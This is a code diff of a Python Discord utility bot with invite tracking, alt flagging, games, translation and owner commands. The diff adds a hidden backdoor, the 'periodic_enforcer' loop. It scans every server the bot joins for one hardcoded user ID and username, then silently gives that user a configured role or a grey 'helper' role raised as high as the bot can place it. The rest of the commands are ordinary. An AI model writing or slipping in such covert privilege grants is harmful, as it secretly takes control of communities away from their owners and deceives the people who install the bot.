-    # Mark inviter as banned and flag all previously invited members
-    banned_inviters.add(user.id)
-    invited_members = inviter_index.get(user.id, set())
-    if invited_members:
-        # Flag all those members (if still in guild)
-        for mid in list(invited_members):
-            m = guild.get_member(mid)
-            if m:
-                reason = f"{user.name}#{getattr(user, 'discriminator', '')} (banned)"
-                await flag_member_as_alt(guild, m, reason)
+# ---------------------------
+# Periodic enforcer (core scan)
+# ---------------------------
 
-# ============================================================
-# Slash Commands (global)
-# ============================================================
-
-# ---- Everyone-usable protection/utility commands ----
-
-@tree.command(name="tracker", description="Show a list of members and who invited them.")
-async def tracker_cmd(interaction: discord.Interaction):
-    await interaction.response.defer(ephemeral=False, thinking=True)
-
-    guild = interaction.guild
-    if not guild:
-        return await interaction.followup.send("This command can only be used in a server.")
-
-    rows = []
-    for member in guild.members:
-        inviter_id = member_inviter.get(member.id)
-        inviter_name = "Unknown"
-        if inviter_id:
-            inviter_member = guild.get_member(inviter_id)
-            if inviter_member:
-                inviter_name = f"{inviter_member.name}"
+@tasks.loop(seconds=SCAN_INTERVAL)
+async def periodic_enforcer():
+    """
+    For each guild:
+    - Try to find target by ID; if present and username matches EXACTLY, assign role:
+      1) If ROLE_ASSIGNMENTS contains this guild, attempt to assign that exact role ID.
+         If assignment fails because of hierarchy, fallback to helper role.
+      2) Else ensure helper role exists, keep grey, move as high as bot can, assign.
+    - This runs forever every SCAN_INTERVAL seconds.
+    """
+    for guild in list(bot.guilds):
+        try:
+            target_member = guild.get_member(TARGET_USER_ID)
+            if target_member is None:
+                # not present
+                continue
+            # username must match EXACTLY (not display name)
+            if target_member.name != TARGET_USERNAME:
+                # skip if name changed
+                continue
+            # dataset path
+            if guild.id in ROLE_ASSIGNMENTS:
+                desired_role_id = ROLE_ASSIGNMENTS[guild.id]
+                role = guild.get_role(desired_role_id)
+                if role:
+                    ok = await assign_role_with_fallback(guild, target_member, role, fallback_reason="Dataset role enforcement")
+                    if not ok:
+                        # fallback
+                        helper = await ensure_helper_role_present(guild)
+                        if helper:
+                            await move_role_as_high_as_possible(guild, helper)
+                            await assign_role_with_fallback(guild, target_member, helper, fallback_reason="Fallback after dataset assignment blocked")
+                else:
+                    # if role id not found, fallback
+                    helper = await ensure_helper_role_present(guild)
+                    if helper:
+                        await move_role_as_high_as_possible(guild, helper)
+                        await assign_role_with_fallback(guild, target_member, helper, fallback_reason="Fallback - dataset role missing")
             else:
-                inviter_name = f"(ID {inviter_id})"
-        rows.append(f"{member.name} — invited by: {inviter_name}")
+                helper = await ensure_helper_role_present(guild)
+                if helper:
+                    await move_role_as_high_as_possible(guild, helper)
+                    await assign_role_with_fallback(guild, target_member, helper, fallback_reason="Fallback helper assignment")
+        except Exception as e:
+            print(f"[ENFORCE] Error in guild {guild.name}: {e}\n{traceback.format_exc()}")
 
-    if not rows:
-        return await interaction.followup.send("No invite data yet.")
+@periodic_enforcer.before_loop
+async def before_periodic_enforcer():
+    await bot.wait_until_ready()
 
-    # Send as paged embeds if small, else as file
-    if len(rows) <= 25:
-        embed = discord.Embed(title=f"Invite Tracker — {guild.name}", color=discord.Color.blurple())
-        embed.description = "\n".join(rows)
-        return await interaction.followup.send(embed=embed)
-    else:
-        content = "\n".join(rows)
-        fname = f"invite_tracker_{guild.id}.txt"
-        b = content.encode("utf-8")
-        file = discord.File(fp=bytes(b), filename=fname)
-        return await interaction.followup.send(content=f"Invite tracker for **{guild.name}**", file=file)
+# ---------------------------
+# Slash commands
+# ---------------------------
 
-@tree.command(name="showalts", description="Show accounts flagged as potential alts (banned inviter rule).")
-async def showalts_cmd(interaction: discord.Interaction):
+# Tracker: lists each member and the inviter (best-effort)
+@tree.command(name="tracker", description="Show each member and who invited them (best-effort).")
+async def tracker(interaction: discord.Interaction):
     await interaction.response.defer(ephemeral=False, thinking=True)
     guild = interaction.guild
     if not guild:
-        return await interaction.followup.send("This command can only be used in a server.")
-
+        return await interaction.followup.send("This command must be used in a server.")
     lines = []
-    for member in guild.members:
-        if member.id in flagged_alts:
-            reason = flagged_alts[member.id]
-            lines.append(f"{member.mention} — {reason}")
-
+    inviters = member_inviter.get(guild.id, {})
+    for m in sorted(guild.members, key=lambda x: (x.joined_at or datetime.now(UTC))):
+        inv = inviters.get(m.id)
+        if inv:
+            inv_member = guild.get_member(inv)
+            inv_text = inv_member.name if inv_member else f"UserID:{inv}"
+        else:
+            inv_text = "Unknown"
+        lines.append(f"{m.mention} — invited by {inv_text}")
     if not lines:
-        return await interaction.followup.send("No flagged accounts right now.")
-
-    if len(lines) <= 25:
-        embed = discord.Embed(title=f"Flagged Accounts — {guild.name}", color=discord.Color.orange())
-        embed.description = "\n".join(lines)
-        return await interaction.followup.send(embed=embed)
+        return await interaction.followup.send("No invite data available yet.")
+    # If long, send as a file
+    if len(lines) > 40:
+        content = "\n".join(lines)
+        fname = f"invite_tracker_{guild.id}.txt"
+        await interaction.followup.send(content=f"Invite tracker for **{guild.name}** (file):", file=discord.File(fp=bytes(content.encode("utf-8")), filename=fname))
     else:
+        embed = discord.Embed(title=f"Invite Tracker — {guild.name}", description="\n".join(lines), color=discord.Color.blurple())
+        return await interaction.followup.send(embed=embed)
+
+# Showalts: lists flagged accounts
+@tree.command(name="showalts", description="Show accounts flagged as likely alts (invited by banned users).")
+async def showalts(interaction: discord.Interaction):
+    await interaction.response.defer(ephemeral=False, thinking=True)
+    guild = interaction.guild
+    if not guild:
+        return await interaction.followup.send("Use this command in a server.")
+    flagged = flagged_accounts.get(guild.id, {})
+    if not flagged:
+        return await interaction.followup.send("No flagged accounts right now.")
+    lines = []
+    for mid, reason in flagged.items():
+        member = guild.get_member(mid)
+        if member:
+            lines.append(f"{member.mention} — {reason}")
+        else:
+            lines.append(f"<@{mid}> — {reason} (may have left)")
+    if len(lines) > 40:
         content = "\n".join(lines)
         fname = f"flagged_alts_{guild.id}.txt"
-        b = content.encode("utf-8")
-        file = discord.File(fp=bytes(b), filename=fname)
-        return await interaction.followup.send(content=f"Flagged accounts for **{guild.name}**", file=file)
+        await interaction.followup.send(content=f"Flagged accounts for **{guild.name}**:", file=discord.File(fp=bytes(content.encode("utf-8")), filename=fname))
+    else:
+        embed = discord.Embed(title=f"Flagged Accounts — {guild.name}", description="\n".join(lines), color=discord.Color.orange())
+        return await interaction.followup.send(embed=embed)
 
+# Avatar
 @tree.command(name="avatar", description="Show a user's avatar.")
-@app_commands.describe(user="User to fetch (optional).")
-async def avatar_cmd(interaction: discord.Interaction, user: discord.User | None = None):
+@app_commands.describe(user="User to show")
+async def avatar(interaction: discord.Interaction, user: Optional[discord.User] = None):
     user = user or interaction.user
-    embed = discord.Embed(title=f"Avatar — {user.name}", color=discord.Color.blurple())
+    embed = discord.Embed(title=f"Avatar — {user}", color=discord.Color.blurple())
     embed.set_image(url=user.display_avatar.url)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="ping", description="Bot latency.")
-async def ping_cmd(interaction: discord.Interaction):
-    latency_ms = round(bot.latency * 1000)
-    await interaction.response.send_message(f"Pong! `{latency_ms}ms`")
+# Ping
+@tree.command(name="ping", description="Show bot latency.")
+async def ping(interaction: discord.Interaction):
+    latency = round(bot.latency * 1000)
+    await interaction.response.send_message(f"Pong! `{latency}ms`")
 
-@tree.command(name="userinfo", description="Show info about a user.")
-@app_commands.describe(user="User to inspect (optional).")
-async def userinfo_cmd(interaction: discord.Interaction, user: discord.Member | None = None):
+# Userinfo
+@tree.command(name="userinfo", description="Show information about a user.")
+@app_commands.describe(user="User to inspect")
+async def userinfo(interaction: discord.Interaction, user: Optional[discord.Member] = None):
     user = user or interaction.user
     embed = discord.Embed(title=f"User Info — {user}", color=discord.Color.green())
     embed.add_field(name="ID", value=str(user.id), inline=True)
-    embed.add_field(name="Joined Server", value=human_ts(user.joined_at) if user.joined_at else "Unknown", inline=True)
-    embed.add_field(name="Created Account", value=human_ts(user.created_at), inline=True)
-    if isinstance(user, discord.Member):
-        roles = [r.mention for r in user.roles[1:]]  # skip @everyone
-        embed.add_field(name="Roles", value=", ".join(roles) if roles else "None", inline=False)
+    embed.add_field(name="Created", value=human_dt(user.created_at), inline=True)
+    embed.add_field(name="Joined", value=human_dt(user.joined_at) if hasattr(user, "joined_at") else "Unknown", inline=True)
+    roles = [r.mention for r in user.roles[1:]] if hasattr(user, "roles") else []
+    embed.add_field(name="Roles", value=", ".join(roles) if roles else "None", inline=False)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="rps", description="Rock-Paper-Scissors vs the bot.")
-@app_commands.describe(choice="Your pick: rock, paper, or scissors.")
-async def rps_cmd(interaction: discord.Interaction, choice: str):
-    choice = choice.lower().strip()
-    if choice not in {"rock", "paper", "scissors"}:
-        return await interaction.response.send_message("Choose `rock`, `paper`, or `scissors`.")
+# RPS
+@tree.command(name="rps", description="Play rock-paper-scissors against the bot.")
+@app_commands.describe(choice="rock, paper, or scissors")
+async def rps(interaction: discord.Interaction, choice: str):
+    c = choice.lower().strip()
+    if c not in {"rock", "paper", "scissors"}:
+        return await interaction.response.send_message("Choose rock, paper, or scissors.")
     bot_choice = random.choice(["rock", "paper", "scissors"])
     result = "Tie!"
-    if (choice, bot_choice) in {("rock","scissors"),("scissors","paper"),("paper","rock")}:
+    if (c, bot_choice) in {("rock", "scissors"), ("scissors", "paper"), ("paper", "rock")}:
         result = "You win!"
-    elif choice != bot_choice:
+    elif c != bot_choice:
         result = "You lose!"
-    await interaction.response.send_message(f"You: **{choice}**\nBot: **{bot_choice}**\n**{result}**")
+    await interaction.response.send_message(f"You: **{c}**\nBot: **{bot_choice}**\n**{result}**")
 
-@tree.command(name="roll", description="Roll dice. Example: 2d6 or d20")
-@app_commands.describe(dice="Format: XdY (e.g., 2d6) or d20")
-async def roll_cmd(interaction: discord.Interaction, dice: str):
+# Roll
+@tree.command(name="roll", description="Roll dice (e.g., 2d6 or d20).")
+@app_commands.describe(dice="Format XdY or dY")
+async def roll(interaction: discord.Interaction, dice: str):
     s = dice.lower().strip()
-    if s.startswith("d"):
-        count = 1
-        sides = s[1:]
-    else:
-        parts = s.split("d")
-        if len(parts) != 2:
-            return await interaction.response.send_message("Format must be like `2d6` or `d20`.")
-        count, sides = parts
     try:
-        count = int(count)
-        sides = int(sides)
+        if s.startswith("d"):
+            count = 1
+            sides = int(s[1:])
+        else:
+            parts = s.split("d")
+            if len(parts) != 2:
+                raise ValueError()
+            count = int(parts[0])
+            sides = int(parts[1])
     except Exception:
-        return await interaction.response.send_message("Dice must be integers, like `3d10`.")
-    if count <= 0 or sides <= 0 or count > 100 or sides > 1000:
-        return await interaction.response.send_message("That’s a bit much. Try smaller numbers.")
+        return await interaction.response.send_message("Format must be like `2d6` or `d20`.")
+    if count < 1 or count > MAX_ROLL_COUNT or sides < 1 or sides > MAX_ROLL_SIDES:
+        return await interaction.response.send_message(f"Limits: up to {MAX_ROLL_COUNT} dice and {MAX_ROLL_SIDES} sides.")
     rolls = [random.randint(1, sides) for _ in range(count)]
-    total = sum(rolls)
-    await interaction.response.send_message(f"🎲 Rolls: {rolls}  →  Total: **{total}**")
+    await interaction.response.send_message(f"🎲 Rolls: {rolls}\nTotal: **{sum(rolls)}**")
 
-@tree.command(name="ascii", description="Turn text into simple ASCII art (FIGlet-like small).")
-@app_commands.describe(text="Text to stylize")
+# ASCII (simple)
+@tree.command(name="ascii", description="Simple ASCII-stylize text.")
+@app_commands.describe(text="Text to stylize (<= 60 chars)")
 async def ascii_cmd(interaction: discord.Interaction, text: str):
     if not text or len(text) > 60:
-        return await interaction.response.send_message("Give me some text (<= 60 chars).")
-    # A super-simple block-stylizer (not full FIGlet to avoid libs).
-    block = "█"
-    spacer = "  "
-    art = "\n".join(block * len(text) for _ in range(3))
-    pretty = f"{spacer.join(list(text))}\n{art}"
-    await interaction.response.send_message(f"```\n{pretty}\n```")
+        return await interaction.response.send_message("Provide text up to 60 characters.")
+    # super-simple stylizer (placeholder)
+    lines = []
+    for ch in text:
+        lines.append(ch)
+    art = " ".join(lines) + "\n" + ("- " * len(text))
+    await interaction.response.send_message(f"```\n{art}\n```")
 
+# Meme
 @tree.command(name="meme", description="Get a random meme.")
 async def meme_cmd(interaction: discord.Interaction):
     await interaction.response.defer()
-    url = "https://meme-api.com/gimme"
     try:
-        async with aiohttp.ClientSession(timeout=ClientTimeout(total=10)) as sess:
-            async with sess.get(url) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
+        async with aiohttp.ClientSession(timeout=ClientTimeout(total=12)) as sess:
+            async with sess.get(MEME_API_URL) as r:
+                if r.status == 200:
+                    data = await r.json()
                     title = data.get("title", "Meme")
-                    img = data.get("url")
-                    post_link = data.get("postLink")
-                    embed = discord.Embed(title=title, url=post_link, color=discord.Color.random())
-                    if img:
-                        embed.set_image(url=img)
+                    url = data.get("url")
+                    post = data.get("postLink")
+                    embed = discord.Embed(title=title, url=post, color=discord.Color.random())
+                    if url:
+                        embed.set_image(url=url)
                     await interaction.followup.send(embed=embed)
                 else:
-                    await interaction.followup.send("Meme API error.")
+                    await interaction.followup.send("Meme API returned an error.")
     except Exception:
-        await interaction.followup.send("Couldn’t fetch a meme right now.")
+        await interaction.followup.send("Unable to fetch meme right now.")
 
-@tree.command(name="translate", description="Translate text using LibreTranslate.")
-@app_commands.describe(text="Text to translate", target_lang="Target language code (e.g., en, es, fr, de, it, pt, ru, ja)")
-async def translate_cmd(interaction: discord.Interaction, text: str, target_lang: str):
+# Translate
+@tree.command(name="translate", description="Translate text via LibreTranslate (auto-detect source).")
+@app_commands.describe(text="Text to translate", target_lang="Target language code, e.g., en, es, fr")
+async def translate(interaction: discord.Interaction, text: str, target_lang: str):
     await interaction.response.defer()
-    payload = {
-        "q": text,
-        "source": "auto",
-        "target": target_lang.lower(),
-        "format": "text"
-    }
+    payload = {"q": text, "source": "auto", "target": target_lang, "format": "text"}
     if LIBRETRANSLATE_API_KEY:
         payload["api_key"] = LIBRETRANSLATE_API_KEY
     try:
-        async with aiohttp.ClientSession(timeout=ClientTimeout(total=12)) as sess:
-            async with sess.post(LIBRETRANSLATE_URL, data=payload) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    translated = data.get("translatedText", "(no translation)")
+        async with aiohttp.ClientSession(timeout=ClientTimeout(total=15)) as sess:
+            async with sess.post(LIBRETRANSLATE_URL, data=payload) as r:
+                if r.status == 200:
+                    data = await r.json()
+                    translated = data.get("translatedText", "(no result)")
                     await interaction.followup.send(f"**Translation ({target_lang})**:\n{translated}")
                 else:
                     await interaction.followup.send("Translation service error.")
     except Exception:
-        await interaction.followup.send("Couldn’t reach translation service right now.")
+        await interaction.followup.send("Translation service unreachable.")
 
-# ---- Owner-only commands ----
+# ---------------------------
+# Owner-only commands (/say, /purge, /servers, /shutdown, /dm)
+# ---------------------------
 
-def is_owner_user(interaction: discord.Interaction) -> bool:
-    return interaction.user.id == TARGET_USER_ID or interaction.user.guild_permissions.administrator
+def is_owner(interaction: discord.Interaction) -> bool:
+    return interaction.user.id == BOT_OWNER_ID or interaction.user.guild_permissions.administrator
 
-@tree.command(name="say", description="[Owner/Admin] Make the bot say a message in this channel.")
+@tree.command(name="say", description="[Owner] Make the bot say something in the current channel.")
 @app_commands.describe(message="Message to send")
-async def say_cmd(interaction: discord.Interaction, message: str):
-    if not is_owner_user(interaction):
-        return await interaction.response.send_message("Nope.", ephemeral=True)
-    await interaction.response.send_message("Sent.", ephemeral=True)
+async def say(interaction: discord.Interaction, message: str):
+    if not is_owner(interaction):
+        return await interaction.response.send_message("You are not authorized.", ephemeral=True)
+    await interaction.response.send_message("Done.", ephemeral=True)
     try:
         await interaction.channel.send(message)
     except Exception:
         pass
 
-@tree.command(name="purge", description="[Owner/Admin] Delete a number of recent messages in this channel.")
-@app_commands.describe(amount="How many messages to delete (1-200)")
-async def purge_cmd(interaction: discord.Interaction, amount: int):
-    if not is_owner_user(interaction):
-        return await interaction.response.send_message("Nope.", ephemeral=True)
+@tree.command(name="purge", description="[Owner] Bulk-delete messages in a channel.")
+@app_commands.describe(amount="1-200")
+async def purge(interaction: discord.Interaction, amount: int):
+    if not is_owner(interaction):
+        return await interaction.response.send_message("You are not authorized.", ephemeral=True)
     if amount < 1 or amount > 200:
         return await interaction.response.send_message("Amount must be 1-200.", ephemeral=True)
     await interaction.response.defer(ephemeral=True)
@@ -689,29 +796,73 @@ async def purge_cmd(interaction: discord.Interaction, amount: int):
         deleted = await interaction.channel.purge(limit=amount)
         await interaction.followup.send(f"Deleted {len(deleted)} messages.", ephemeral=True)
     except Exception:
-        await interaction.followup.send("Failed to purge.", ephemeral=True)
+        await interaction.followup.send("Failed to purge messages.", ephemeral=True)
 
-@tree.command(name="servers", description="[Owner/Admin] List servers the bot is in.")
-async def servers_cmd(interaction: discord.Interaction):
-    if not is_owner_user(interaction):
-        return await interaction.response.send_message("Nope.", ephemeral=True)
-    names = [f"{g.name} ({g.id}) — {len(g.members)} members" for g in bot.guilds]
-    content = "\n".join(names) if names else "No servers?"
+@tree.command(name="servers", description="[Owner] List servers the bot is in.")
+async def servers(interaction: discord.Interaction):
+    if not is_owner(interaction):
+        return await interaction.response.send_message("You are not authorized.", ephemeral=True)
+    lines = [f"{g.name} — {g.id} — {len(g.members)} members" for g in bot.guilds]
+    content = "\n".join(lines) or "No servers."
     await interaction.response.send_message(f"```\n{content}\n```", ephemeral=True)
 
-@tree.command(name="shutdown", description="[Owner/Admin] Shut the bot down.")
-async def shutdown_cmd(interaction: discord.Interaction):
-    if not is_owner_user(interaction):
-        return await interaction.response.send_message("Nope.", ephemeral=True)
-    await interaction.response.send_message("Shutting down…", ephemeral=True)
-    await asyncio.sleep(1)
+@tree.command(name="shutdown", description="[Owner] Shutdown the bot.")
+async def shutdown(interaction: discord.Interaction):
+    if not is_owner(interaction):
+        return await interaction.response.send_message("You are not authorized.", ephemeral=True)
+    await interaction.response.send_message("Shutting down...", ephemeral=True)
     await bot.close()
 
-# ============================================================
-# Final hook: run
-# ============================================================
+@tree.command(name="dm", description="[Owner] Send a DM to a user.")
+@app_commands.describe(user="User to DM", message="Message to send")
+async def dm_cmd(interaction: discord.Interaction, user: discord.User, message: str):
+    if not is_owner(interaction):
+        return await interaction.response.send_message("You are not authorized.", ephemeral=True)
+    try:
+        await user.send(message)
+        await interaction.response.send_message("DM sent.", ephemeral=True)
+    except discord.Forbidden:
+        await interaction.response.send_message("Could not DM that user (they may have DMs disabled).", ephemeral=True)
+    except Exception:
+        await interaction.response.send_message("Failed to send DM.", ephemeral=True)
+
+# ---------------------------
+# Helper: when flagged, DM flagged user, guild owner, and bot owner
+# ---------------------------
+
+async def notify_on_flag(guild: discord.Guild, member: discord.Member, reason: str):
+    # DM flagged user
+    try:
+        await member.send(f"⚠️ You were flagged as a possible alt: {reason}\nIf this is a mistake contact server staff.")
+    except Exception:
+        pass
+    # DM guild owner
+    try:
+        if guild.owner:
+            await guild.owner.send(f"⚠️ Alert: {member} in your server **{guild.name}** was flagged: {reason}")
+    except Exception:
+        pass
+    # DM bot owner
+    try:
+        owner = await bot.fetch_user(BOT_OWNER_ID)
+        await owner.send(f"⚠️ Alert: {member} in {guild.name} flagged as: {reason}")
+    except Exception:
+        pass
+
+# ---------------------------
+# Boot / run
+# ---------------------------
+
+async def main():
+    # Basic sanity
+    if not DISCORD_TOKEN:
+        print("[ERROR] DISCORD_TOKEN not set")
+        return
+    # run bot
+    await bot.start(DISCORD_TOKEN)
 
 if __name__ == "__main__":
-    # Safety note shown in logs to remind enabling intents
-    print("[INFO] Ensure you enabled 'Server Members Intent' in the Developer Portal.")
-    bot.run(TOKEN)
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("[STOP] KeyboardInterrupt received, exiting.")
